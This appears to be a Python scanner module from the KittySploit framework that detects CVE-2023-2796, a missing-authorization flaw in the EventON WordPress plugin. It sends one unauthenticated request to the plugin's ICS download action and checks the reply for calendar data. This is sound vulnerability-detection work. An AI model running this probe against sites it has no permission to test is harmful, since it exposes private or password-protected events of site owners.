#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The EventON WordPress plugin before 2."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'EventON <= 2.1 - Missing Authorization Detection',
        'description': 'The EventON WordPress plugin before 2.1.2 lacks authentication and authorization in its eventon_ics_download ajax action, allowing unauthenticated visitors to access private and password protected Events by guessing their numeric id.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'wpscan', 'packetstorm', 'wordpress', 'wp-plugin', 'wp', 'eventon', 'bypass', 'myeventon', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.wordfence.com/threat-intel/vulnerabilities/id/dba3f3a6-3f55-4f4e-98e4-bb98d9c94bdd',
            'https://wpscan.com/vulnerability/e9ef793c-e5a3-4c55-beee-56b0909f7a0d',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-2796',
            'http://packetstormsecurity.com/files/173984/WordPress-EventON-Calendar-4.4-Insecure-Direct-Object-Reference.html',
            'https://github.com/nullfuzz-pentest/shodan-dorks',
        ],
        'cve': 'CVE-2023-2796',
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp-admin/admin-ajax.php?action=eventon_ics_download&event_id=1', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('BEGIN:VCALENDAR', 'END:VCALENDAR',)
        header_any = ('text/Calendar',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="EventON <= 2.1 - Missing Authorization detected",
                path='/wp-admin/admin-ajax.php?action=eventon_ics_download&event_id=1',
            )
            return True
        return False

